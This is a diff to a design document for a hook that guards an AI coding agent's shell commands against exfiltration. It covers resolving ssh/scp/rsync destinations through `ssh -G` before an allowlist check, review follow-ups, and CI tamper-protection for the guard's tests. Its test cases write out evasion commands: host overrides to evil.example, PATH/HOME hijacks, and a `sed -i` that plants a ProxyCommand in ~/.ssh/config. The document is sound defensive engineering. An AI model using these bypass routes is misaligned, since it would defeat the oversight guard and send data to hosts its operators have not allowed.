@@ -40,8 +40,10 @@ the resolver steps below.)
 
 ## Scope
 
-A `.claude/hooks` change only, plus its tests and a short note in the guard's
-design doc. Concretely:
+A change to `.claude/hooks` (production code, tests) and a short note in the
+guard's design doc, **plus two mandatory CI-protection registrations** that are
+not production code but are a required part of the same change (items 4a–4b
+below; the registration is also stated as a firm Dependency). Concretely:
 
 1. **`.claude/hooks/lib/exfil_bash_network.py`** — in `_check_ssh_family` (now
    called with the command's captured `env`), resolve each ssh-family destination
@@ -97,6 +99,17 @@ design doc. Concretely:
    that ssh-family destinations are resolved through `ssh -G` before the allowlist
    match (the doc currently states only that ssh-family handling lives in
    `exfil_bash_network.py`).
+4. **Two CI-protection registrations (not production code, but required).** The
+   new test module must be added to the guard's integrity lists, or a later branch
+   could weaken the alias regression tests unnoticed. These files are under the
+   CI-file lock, so this registration lands on a `ci/...` branch (or with the
+   owner's signed bypass); the implementation is **incomplete** until it does. See
+   the matching firm Dependency for the full rationale.
+   - **4a. `tools/ci/agent-protection/verify-exfiltration-guard.sh`** — add
+     `test_exfiltration_guard_ssh_alias.py` to `GUARD_FILES`.
+   - **4b. `.github/workflows/analysis.yaml`** — add
+     `test_exfiltration_guard_ssh_alias.py` to the `PROTECTED_FILES` list of the
+     "Check for enforcement infrastructure tampering" step.
 
 Out of scope (and why):
 
@@ -323,22 +336,39 @@ Behaviour, in order:
    host/config-selecting `-o` values); the routing and command-executing `-o`
    forms are already refused before resolution, so they never reach this call.
 
-   **A resolution failure blocks when the command carries a host/config-selecting
-   override.** `ssh -G` can fail to launch, time out, or exit non-zero; the
-   literal fallback (returning `[token]`) is safe *only* when the literal token
-   is itself what ssh would resolve. It is **not** safe when the command line
-   redirects the effective destination with `-F`, a `-l`/`user@`, or a
-   host-selecting `-o` (`HostName`, `Port`, `User`, `HostKeyAlias`,
-   `CanonicalizeHostname`, …): there, returning `[amd-halo]` for
-   `ssh -o HostName=evil.example amd-halo` would let `_require_lab` clear the
-   allowlisted literal while the real ssh connects to `evil.example` — the exact
-   hole the forwarding contract exists to close, reopened whenever an attacker
-   can force `ssh -G` to fail. So a launch-failure/timeout/non-zero exit
-   **blocks** when any host/config-selecting override is present on the command
-   line, and falls back to the literal match only for a bare destination with no
-   such override (`ssh amd-halo`), where the literal token is the effective
-   destination. (A zero-exit but malformed or incomplete answer already blocks —
-   step 5.)
+   **A resolution failure falls back to the literal match only when step 3 found
+   the config chain genuinely absent.** `ssh -G` can fail to launch, time out, or
+   exit non-zero; the literal fallback (returning `[token]`) is safe *only* when
+   the literal token is provably what ssh would resolve — which requires that
+   **nothing** in the effective config could rewrite the destination. Two
+   conditions each defeat that, and either one makes a failure block:
+   - **A host/config-selecting override on the command line.** `-F`, a `-l`/`user@`,
+     or a host-selecting `-o` (`HostName`, `Port`, `User`, `HostKeyAlias`,
+     `CanonicalizeHostname`, …) redirects the effective destination, so returning
+     `[amd-halo]` for `ssh -o HostName=evil.example amd-halo` would let
+     `_require_lab` clear the allowlisted literal while the real ssh connects to
+     `evil.example` — the exact hole the forwarding contract exists to close,
+     reopened whenever an attacker can force `ssh -G` to fail.
+   - **A reachable config chain that step 3 scanned.** Even a *bare* destination
+     with no command-line override is unsafe when a config file exists: the step-3
+     scan proves only that the chain carries no *command-executing* directive — it
+     does **not** inspect `HostName`/`ProxyJump`/`Match` *host-rewriting*
+     directives, which only `ssh -G` resolves. A clean config `Host amd-halo` /
+     `HostName evil.example` passes the scan, yet if `ssh -G amd-halo` then times
+     out, returning `[amd-halo]` clears the allowlist while the real ssh connects
+     to `evil.example`. So a bare-destination resolution failure falls back to the
+     literal match **only** when step 3 reported the config chain genuinely absent
+     (no per-user config, no system config, no `-F`, no `Include` match) — where
+     the literal token is provably the effective destination because there is no
+     config to rewrite it. When step 3 found a reachable config, a resolution
+     failure **blocks**.
+
+   So a launch-failure/timeout/non-zero exit **blocks** when any host/config-
+   selecting override is present *or* when step 3 found a reachable config, and
+   falls back to the literal match only for a bare destination with no such
+   override **and** a genuinely-absent config chain (`ssh amd-halo` on a node with
+   no SSH config at all), where the literal token is the effective destination. (A
+   zero-exit but malformed or incomplete answer already blocks — step 5.)
 5. **Parse** the `key value` lines of the output (ssh prints keys lowercased,
    one per line) and **validate the schema strictly**. Read `hostname`,
    `proxyjump`, `proxycommand`. A successful `ssh -G` prints exactly one
@@ -447,8 +477,8 @@ reconstructed from the prose.
 | Resolved `hostname` not allowlisted, resolved `proxycommand` ≠ `none`, or a resolved `proxyjump` hop not allowlisted | **Block** | Steps 6-7 |
 | ProxyJump depth cap, invocation cap, or cycle exhausted | **Block** | Step 7 |
 | `argv[0]` path-qualified, or the resolver's `ssh` absent / outside `SYSTEM_PREFIXES` | **Literal fallback** | Step 2 |
-| `ssh -G` fails (`OSError`/`SubprocessError`/timeout/non-zero exit) **and** the command carries a host/config-selecting override (`-F`, `-l`/`user@`, host-selecting `-o`) | **Block** | Step 4 |
-| `ssh -G` fails (`OSError`/`SubprocessError`/timeout/non-zero exit) for a bare destination with no host/config-selecting override | **Literal fallback** | Step 4 |
+| `ssh -G` fails (`OSError`/`SubprocessError`/timeout/non-zero exit) **and** the command carries a host/config-selecting override (`-F`, `-l`/`user@`, host-selecting `-o`) **or** step 3 found a reachable config chain | **Block** | Step 4 |
+| `ssh -G` fails (`OSError`/`SubprocessError`/timeout/non-zero exit) for a bare destination with no host/config-selecting override **and** step 3 found the config chain genuinely absent | **Literal fallback** | Step 4 |
 | Config chain genuinely absent (no user/system config, no `-F`, `Include` glob matches nothing) | **Literal fallback** | Step 3 |
 | rsync daemon-mode (`host::module`) or `rsync://` destination (no ssh) | **Literal fallback** (never resolved) | Faithful resolution |
 
@@ -530,8 +560,19 @@ dispatcher's command loop in `exfil_bash_dispatch.py` already tracks the
 effective directory through a `cd` (including restoring it when a `( … )`
 subshell closes), and carry them on the `BashContext` handed to
 `_check_simple_command` (as `ctx.at(cwd)` carries the directory today). A
-preceding simple command whose assignment prefix, or whose `export`/`declare
--x`/`typeset -x` operands, name `HOME` or `PATH` adds that name. An `unset HOME`/
+preceding simple command whose assignment prefix, or whose `export`/`declare`/
+`typeset`/`readonly` operands, name `HOME` or `PATH` adds that name. The
+`declare`/`typeset`/`readonly` builtins assign a shell variable **whether or not
+`-x` is given** — `declare PATH=/tmp` changes the shell's own command lookup for
+the rest of the line exactly as a bare `PATH=/tmp` assignment does, and
+`declare HOME=/tmp; export HOME` then changes the child's config environment — so
+the tracker must treat a `declare`/`typeset`/`readonly` *assignment* to `HOME` or
+`PATH` as adding that name regardless of the `-x` flag, in every spelling
+(assignment, the `+=` append form, and the option-cluster spellings such as
+`declare -gx`). A reader that inspects only `-x` would miss `declare PATH=/tmp`.
+If the operands of such a builtin cannot be parsed confidently (an unusual option
+spelling, a computed name), it is treated as unknown — as if both names were set —
+the conservative direction. An `unset HOME`/
 `unset PATH` (and `export -n HOME`/`export -n PATH`) **also adds** the name:
 clearing the variable changes the command environment the real ssh inherits and
 the shell's own command lookup (an unset `PATH` makes the shell search a built-in
@@ -595,9 +636,27 @@ scan has not yet established as part of the chain, but that an `Include` *patter
 already read could later match (an `Include /tmp/*.conf` with a write that creates
 `/tmp/new.conf`), is also a possible modification: the poison set is every path
 the scanned `Include` directives name or glob, **including currently-absent
-targets**. When the mark is set — or when a write target cannot be determined (an
-unparsed redirection, a variable path) — the ssh-family command blocks rather than
-scanning or resolving.
+targets**.
+
+**The poison rule is conservative, not an enumerated write-form allowlist.**
+Redirections and the explicit copy/write tools above (`cp`/`mv`/`tee`/`install`/
+`dd of=`) are the *recognised-write* forms whose target can be read directly and
+compared against the chain. But they are not the whole mutation surface: an
+in-place editor (`sed -i`, `perl -i`, `ed`), a truncating or linking tool
+(`truncate`, `ln`, `ln -sf`), or a short interpreter one-liner
+(`python -c '…'.write(…)`, `sh -c '… > …'`) can rewrite a reachable config
+without matching any recognised form. So the dispatcher does **not** decide
+"poison" only when it recognises a write; it decides "no poison" only when every
+earlier command on the line is **proven not to** write into the chain — a command
+whose effect on the config chain the dispatcher cannot rule out poisons the scan.
+Concretely: a recognised-write form whose resolved target is in the chain
+poisons; a recognised read-only/known-safe command (another ssh-family check, a
+pure query like `echo`/`cat` with no redirection into the chain, a `cd`) does
+not; and **any other earlier command** — an unrecognised tool, a recognised tool
+used in an unrecognised way, an in-place mutator, a write whose target cannot be
+resolved (a variable path, an unparsed redirection) — is treated as a possible
+write and **poisons** (block). The default is poison; only a provably
+non-writing command clears it.
 
 **A command substitution is evaluated for the same poison, before the ssh check.**
 A substitution body runs before the command that contains it, yet the dispatcher
@@ -631,10 +690,19 @@ those normalised pairs:
 **Forwarded to `ssh -G` (verbatim, both spellings):**
 
 - `-F <configfile>` — the config file selector. Forwarded as `-F <value>`.
-- `-l <user>` — the login name. Forwarded as `-l <value>`, and a `user@` prefix
-  on the destination is kept (step 4), because SSH config matching keys on the
-  login user through `Match user`; dropping it would let a `Match user` block add
-  a `ProxyJump` or rewrite `HostName` that resolution never sees.
+- `-l <user>` — the login name, **for `ssh` only**. Forwarded as `-l <value>`,
+  and a `user@` prefix on the destination is kept (step 4), because SSH config
+  matching keys on the login user through `Match user`; dropping it would let a
+  `Match user` block add a `ProxyJump` or rewrite `HostName` that resolution never
+  sees. **`-l` is not forwarded for `scp` or `sftp`**: in those programs `-l` is a
+  bandwidth-limit option (`scp -l limit`), not a login name, so forwarding
+  `scp -l 10 alias:/f` as `ssh -G -l 10 alias` would resolve under a bogus
+  `Match user 10` the real scp never uses — missing, not catching, a user-specific
+  route. scp/sftp resolve under the current login user unless a `user@`
+  destination prefix selects one (which is preserved for them — see the
+  user-preservation note below and step 4); their forwarded set is the shared
+  `-F`/`-o` only, with `-l` read as a value flag by their own per-program table
+  (so its argument is not misparsed) but never passed to `ssh -G`.
 - Every `-o <key>=<value>` whose `<key>` is **not** in the rejected set below.
   This deliberately forwards *all* host/config-selecting keys — `HostName`,
   `Port`, `User`, `HostKeyAlias`, `CanonicalizeHostname`, `CanonicalDomains`, and
@@ -682,24 +750,49 @@ host-selecting values or its `-l`/`user@` login — because OpenSSH does not app
 HostName=…` to the jump connection, and forwarding it would let a target
 override clear a non-allowlisted hop.
 
-The `-l <user>` login name **is** forwarded (together with a `user@` prefix on the
-destination): SSH config matching keys on the login user through `Match user`, so
-`-l`/`user@` select which config applies and dropping them would let a
-`Match user` hop route past the allowlist — see resolver step 4. Everything else
-on the command line (positional host, `-p`/`-i`/… transport flags that do not
-select the config) is neither forwarded nor rejected — it does not affect which
-host `ssh -G` reports.
+The `ssh` `-l <user>` login name **is** forwarded (together with a `user@` prefix
+on the destination): SSH config matching keys on the login user through
+`Match user`, so `-l`/`user@` select which config applies and dropping them would
+let a `Match user` hop route past the allowlist — see resolver step 4. The
+`user@` prefix on a destination is preserved for **every** ssh-backed family
+member, not only `ssh` (see "User preservation across the family" below).
+Everything else on the command line (positional host, `-p`/`-i`/… transport flags
+that do not select the config) is neither forwarded nor rejected — it does not
+affect which host `ssh -G` reports.
+
+**User preservation across the family (review follow-up).** Resolver step 4 keeps
+a `user@` prefix so `ssh -G` resolves under the same login user `Match user`
+keys on. For `ssh` the user rides on the positional host, which reaches the
+resolver intact. For `scp`, `sftp` and remote-shell `rsync`, however, the
+destination is a remote spec (`user@host:path`) that today's parser reduces to the
+bare host: `_REMOTE_SPEC` captures only the host group (its `(?:…@)?` user part is
+non-capturing and the code reads `.group(1)`), so `scp attacker@amd-halo-ci:/f`
+and `rsync attacker@amd-halo-ci:dst` arrive at the resolver as `amd-halo-ci` with
+the user already stripped — and would resolve as the default user, missing a
+`Match user attacker` `ProxyJump`/`HostName` route exactly as a dropped `ssh`
+`user@` would. So the remote-spec parser must **retain the authority/user** for
+every ssh-backed member (capturing the optional `user@` and handing the resolver a
+`user@host` token, `:port`/path still stripped), not only for the `ssh`
+positional. Regression cases cover `scp attacker@amd-halo-ci:/f` and
+`rsync attacker@amd-halo-ci:dst` whose `Match user attacker` route is
+non-allowlisted (blocked). Daemon-mode (`host::module`) rsync is still never
+resolved (it does not read ssh config), so its user part is irrelevant.
 
 **The contract is per program, not per family (review follow-up).** Today
 `_check_ssh_family` parses every ssh-family program with the one ssh table
 `_SSH_VALUE_FLAGS`, which is right for ssh only:
 
 - **ssh, scp, sftp** — `-F <file>` and `-o <opt>` mean the same thing to all three,
-  so the forwarded set above applies. scp and sftp take different *other* value
-  flags (for example scp's `-l limit`, `-P port`, `-S program`; sftp's `-b
-  batchfile`, `-D server_path`, `-P port`, `-s subsystem`), so each needs its own
-  value-flag table for `_ssh_positionals` rather than ssh's, or a value is
-  misread as a positional (or the reverse).
+  so the shared part of the forwarded set applies. But `-l` does **not**: it is
+  ssh's login name only, forwarded for `ssh`, while for scp it is a bandwidth limit
+  (`scp -l limit`) and for sftp it is not a login option either — so `-l` is
+  forwarded as a login name for `ssh` alone (see the `-l` bullet above). scp and
+  sftp take different *other* value flags (for example scp's `-l limit`,
+  `-P port`, `-S program`; sftp's `-b batchfile`, `-D server_path`, `-P port`,
+  `-s subsystem`), so each needs its own value-flag table for `_ssh_positionals`
+  rather than ssh's — both so a value is not misread as a positional (or the
+  reverse), and so scp/sftp `-l` is consumed as a value flag yet never handed to
+  `ssh -G`.
 - **rsync — forward nothing.** rsync's `-F` (filter-rule shorthand), `-o`
   (`--owner`), `-p`, `-l`, `-D`, `-c`, `-b`, `-m`, `-S`, `-E`, `-I`, `-P`, … are
   rsync switches with no argument and no meaning to ssh. rsync passes options to
@@ -845,7 +938,13 @@ A reviewer confirms the task is done when:
   resolves under the same login user the real command uses, rather than
   resolving `amd-halo-ci` as the default user and clearing it. The same
   destination without the `Match user` route resolves and is allowed/blocked on
-  the resolved host as usual.
+  the resolved host as usual. The user is preserved for **scp and rsync** too, not
+  only ssh: `scp attacker@amd-halo-ci:/f` and `rsync attacker@amd-halo-ci:dst`,
+  whose `Match user attacker` route resolves to a non-allowlisted host, are
+  **blocked** (the parser retains the `user@` on the remote spec rather than
+  dropping it via `_REMOTE_SPEC.group(1)`), while scp/sftp's `-l` bandwidth-limit
+  flag is **not** forwarded as a login name — `scp -l 10 amd-halo-ci:/f` resolves
+  under the current login user, not a bogus `Match user 10`.
 - Each command-executing `-o` form is **rejected before resolution**:
   `-o ProxyCommand=…`, `-o ProxyJump=…`, `-o LocalCommand=…`,
   `-o PermitLocalCommand=yes`, and the newly-added `-o KnownHostsCommand=…`, in both
@@ -888,7 +987,13 @@ A reviewer confirms the task is done when:
   /tmp/extra.conf; ssh -F /tmp/base.conf amd-halo`, where `/tmp/base.conf`
   includes `/tmp/extra.conf`), and so does a config-writing **command
   substitution** earlier on the line (`: "$(printf 'ProxyCommand …' >
-  ~/.ssh/config)"; ssh amd-halo`).
+  ~/.ssh/config)"; ssh amd-halo`). An **in-place mutator** of a reachable config
+  blocks the same way even though it is not a recognised copy/redirection form:
+  `sed -i 's/.*/ProxyCommand touch \/tmp\/pwned/' ~/.ssh/config; ssh amd-halo` is
+  refused and no sentinel is created, because an earlier command not proven unable
+  to write into the chain poisons the scan (poison-unless-proven-safe), while a
+  harmless preceding read-only command (e.g. `cat somefile; ssh amd-halo`) does
+  not block on this rule.
 - A config-source `-o` is **rejected before resolution**: `ssh -o Include=/tmp/x
   amd-halo` (and the attached `-oInclude=…`, case-insensitively) is **blocked**,
   so no `ssh -G` reads a file the static scan never inspected.
@@ -913,16 +1018,19 @@ A reviewer confirms the task is done when:
   exhaustion (the unresolved hop is never cleared by a literal match, even when the
   unresolved hop token is itself allowlisted).
 - When `ssh -G` fails (fake ssh exits non-zero, or ssh is absent) for a **bare**
-  destination with no host/config-selecting override, the guard falls
-  back to a literal match: an allowlisted literal (`ssh amd-halo`) is still
-  allowed and a non-allowlisted literal (`ssh evil.example`) is still blocked —
-  i.e. identical to today's behaviour. But when `ssh -G` fails for a command that
-  carries a host/config-selecting override, the guard **blocks** rather than
-  falling back: `ssh -o HostName=evil.example amd-halo` with a failing `ssh -G`
-  is refused (it is not cleared by the allowlisted literal `amd-halo`), because
-  the literal is provably not the effective destination the override names — the
-  same for a failing resolution of a `-F`-selected or `user@`/`-l`-qualified
-  destination.
+  destination with no host/config-selecting override **and the config chain is
+  genuinely absent**, the guard falls back to a literal match: an allowlisted
+  literal (`ssh amd-halo`) is still allowed and a non-allowlisted literal
+  (`ssh evil.example`) is still blocked — i.e. identical to today's behaviour. But
+  the guard **blocks** rather than falling back whenever either (a) the command
+  carries a host/config-selecting override — `ssh -o HostName=evil.example
+  amd-halo` with a failing `ssh -G` is refused (not cleared by the allowlisted
+  literal `amd-halo`), the same for a failing resolution of a `-F`-selected or
+  `user@`/`-l`-qualified destination — or (b) step 3 found a **reachable config**
+  that `ssh -G` then failed to resolve: `ssh amd-halo` with a clean (scan-passing)
+  `~/.ssh/config` mapping `Host amd-halo` to `HostName evil.example` and a failing
+  `ssh -G` is **blocked**, because the scan does not inspect host-rewriting
+  directives and the literal is not provably the effective destination.
 - `HOME`/`PATH` set earlier on the line reaches the step-1 refusal in every form:
   `export HOME=/tmp/evil; ssh amd-halo` and `export PATH=/tmp; ssh amd-halo`
   (exported), `PATH=/tmp; ssh amd-halo` and `HOME=/tmp/evil; ssh amd-halo`
@@ -933,7 +1041,10 @@ A reviewer confirms the task is done when:
   amd-halo` and `unset HOME; ssh amd-halo` are **blocked** too (clearing the
   variable is an override), and the `env` wrapper forms `env -i ssh amd-halo`,
   `env -u PATH ssh amd-halo` and `env -u HOME ssh amd-halo` are **blocked** via
-  the override marker the wrapper surfaces.
+  the override marker the wrapper surfaces. A `declare`/`typeset`/`readonly`
+  assignment to `HOME`/`PATH` is tracked **with or without `-x`**:
+  `declare PATH=/tmp; ssh amd-halo` and `readonly HOME=/tmp/evil; ssh amd-halo`
+  are **blocked**, not only `declare -x`/`typeset -x` forms.
 - A path-qualified ssh executable is **not run by the resolver**: with a sentinel
   script at `/tmp/ssh`, `/tmp/ssh amd-halo-ci` falls back to the literal match
   (blocked, alias not allowlisted) and the sentinel is never created; likewise a
@@ -1166,6 +1277,48 @@ question #6, a deliberate approver trade-off rather than a defect):
     Genuinely inert variables (`LANG`, `TERM`, remote-only `SendEnv`/`SetEnv`)
     are still left alone, keeping the "no new vector" claim honest.
 
+A sixth review round (Copilot, PR #1133 HEAD) raised six more points, all valid
+against the live hook code and settled the same way (its one prior open thread —
+the concurrent-writer race — remains Open question #6, a deliberate approver
+trade-off):
+
+23. **Do not forward scp/sftp `-l` as an SSH login option.** Settled in "Faithful
+    resolution": `-l` is ssh's login name only; for scp it is a bandwidth limit
+    (`scp -l limit`) and sftp has no login `-l`, so forwarding `-l` as a login name
+    is restricted to `ssh`, while `user@`, `-F` and `-o` are still shared. scp/sftp
+    parse `-l` with their own value-flag table so its argument is not misread, but
+    never hand it to `ssh -G`.
+24. **Preserve the user for scp and rsync remote specs, not only ssh.** Settled in
+    "User preservation across the family": `_REMOTE_SPEC` drops the `user@` prefix
+    (non-capturing user group, `.group(1)` is host-only), so scp/sftp/remote-shell
+    rsync destinations reached the resolver as the bare host and would resolve as
+    the default user, missing a `Match user` route. The parser must retain the
+    authority/user for every ssh-backed member; scp/rsync user-qualified regression
+    cases are added.
+25. **Restrict literal fallback on `ssh -G` failure to a genuinely-absent config.**
+    Settled in resolver step 4: a bare-destination failure falls back to the literal
+    match only when step 3 found the config chain genuinely absent; a *reachable*
+    config (which the scan clears only for command-execution, not for
+    `HostName`/`ProxyJump` host-rewrites) plus a resolution failure now **blocks**,
+    closing the `Host amd-halo` / `HostName evil.example` + timeout hole.
+26. **Track `declare`/`typeset`/`readonly` assignments, not only `-x`.** Settled in
+    "Preceding HOME/PATH assignments": these builtins assign a shell variable with
+    or without `-x`, so an assignment to `HOME`/`PATH` (or a loader/helper name)
+    through any of them, in any spelling, adds the name to the tracked set; an
+    unparseable operand is treated as unknown.
+27. **Conservative poison for unrecognised config-mutating commands.** Settled in
+    "Config-chain modification earlier on the line": the TOCTOU rule is a
+    poison-unless-proven-safe default, not an enumerated write-form list — an
+    in-place mutator (`sed -i`, `perl -i`, `truncate`), an unrecognised tool, or an
+    unresolvable write target poisons the scan, so the no-TOCTOU guarantee does not
+    depend on the completeness of the recognised-write list.
+28. **Name the two CI registrations in Scope.** Moved into the Scope section (items
+    4a–4b): adding the new test module to `GUARD_FILES`
+    (`verify-exfiltration-guard.sh`) and to the tampering step's `PROTECTED_FILES`
+    (`analysis.yaml`) is listed in Scope as a required, non-production part of the
+    change, matching the firm Dependency, so an implementer cannot read the scope as
+    `.claude/hooks`-only and omit them.
+
 Separately, a verified dependency (not an open question): **`verify-exfiltration-guard.sh`
 base-branch comparison.** The verifier's `GUARD_FILES` list includes
 `exfil_bash_network.py` and `test_exfiltration_guard_check.py`, and its CHECK 3
@@ -1212,13 +1365,20 @@ should decide deliberately.
 3. **How precise can the TOCTOU config-write detection be?** The fail-closed rule
    in "Config-chain modification earlier on the line" blocks an ssh-family command
    whenever an earlier command on the line could write into the reachable config
-   chain, and blocks when a write target cannot be determined. This refuses the
-   rare legitimate `write-config; ssh` one-liner and depends on the dispatcher
-   recognising the write forms (redirections, `cp`/`mv`/`tee`/`install`/`dd`). A
-   write via an unrecognised tool, or into a path the scanner cannot resolve, is
-   handled by the catch-all "cannot determine ⇒ block", but the approver should
-   confirm the conservative blocking is acceptable and that the recognised-write
-   list is broad enough for the real threat.
+   chain. The rule is a conservative default, **not** an enumerated write-form
+   allowlist: recognised writes (redirections, `cp`/`mv`/`tee`/`install`/`dd`) into
+   the chain poison, recognised read-only commands clear, and **any other** earlier
+   command — an in-place mutator (`sed -i`, `perl -i`, `truncate`), a link/move
+   through an unrecognised syntax, a short `python`/`sh` one-liner, or a write
+   whose target cannot be resolved — is treated as a possible write and poisons
+   (blocks). So the no-TOCTOU guarantee does not rest on the completeness of a
+   recognised-write list; it rests on the dispatcher proving a command *cannot*
+   touch the chain before it clears it. This refuses the rare legitimate
+   `write-config; ssh` one-liner, and may also refuse an ssh-family command merely
+   preceded by an unrelated unrecognised command on the same line. The approver
+   should confirm that this conservative default (poison unless proven safe) and
+   the resulting usability cost are acceptable, and that the proven-safe set is
+   broad enough that common, harmless preceding commands do not needlessly block.
 4. **How completely must the config scan reproduce OpenSSH's `Include`
    resolution?** The scan has to locate every file `ssh -G` would read, but
    OpenSSH expands `Include` (and `-F`) paths through `%`-tokens, `${ENV}`
